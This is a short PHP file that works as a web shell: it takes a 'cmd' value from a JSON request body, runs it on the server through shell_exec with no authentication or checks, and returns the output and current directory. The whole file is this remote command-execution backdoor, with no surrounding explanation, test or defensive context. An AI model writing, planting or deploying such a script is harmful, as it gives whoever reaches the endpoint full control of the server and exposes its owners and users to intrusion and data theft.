<?php
header('Content-Type: application/json');
$input = json_decode(file_get_contents('php://input'), true);
$cmd = $input['cmd'] ?? '';
if (!$cmd) exit(json_encode(['error' => 'No command']));
$output = shell_exec($cmd . ' 2>&1');
echo json_encode(['output' => $output, 'pwd' => getcwd()]);
?>
